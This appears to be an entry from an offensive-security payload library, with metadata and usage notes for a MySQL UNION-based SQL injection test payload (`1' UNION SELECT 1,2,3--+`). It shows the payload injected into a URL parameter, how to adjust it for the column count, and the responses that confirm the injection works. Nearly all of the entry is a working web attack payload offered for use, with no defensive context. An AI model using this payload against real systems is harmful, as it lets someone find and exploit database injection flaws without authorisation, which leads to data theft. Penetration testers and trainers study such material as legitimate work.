---
id: 864989ed-e649-404e-bbfc-368917b385da
name: mysql-union-select-column-test
type: command
executor: sql
data: '1'' UNION SELECT 1,2,3--+'
output: null
created_at: '2023-04-06T03:56:34.261642+00:00'
updated_at: '2023-04-10T20:22:54.557454+00:00'
platforms:
  - Web
  - MySQL
tags:
  - sql-injection
  - union-based
verified: true
validated: true
---

# mysql-union-select-column-test

## Command

```sql
1' UNION SELECT 1,2,3--+
```

## Description

This payload tests if a SQL injection point supports UNION-based attacks after column count is determined. It appends a UNION SELECT with null-matched columns (here assuming 3) to verify injectability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_COLUMN_COUNT` | Number of columns from prior detection (replace 1,2,3) | Yes |
| `$_INJECTION_POINT` | Vulnerable input field | Yes |
| `--+` | Query termination comment | Yes |

## Examples

### Basic Usage

`https://example.com/page?id=1' UNION SELECT 1,2,3--+`

### Advanced Usage

For 4 columns: `1' UNION SELECT 1,2,3,4--+`

## Expected Output

Successful injection shows literal values in response, e.g., page content including "1 2 3" without errors.

If mismatched columns, expect an error like "The used SELECT statements have a different number of columns".

## Related

- [[procedures/MySQL-Column-Detection-via-Order-By-or-Group-By]]
- [[codes/mysql-order-by-column-detection]]
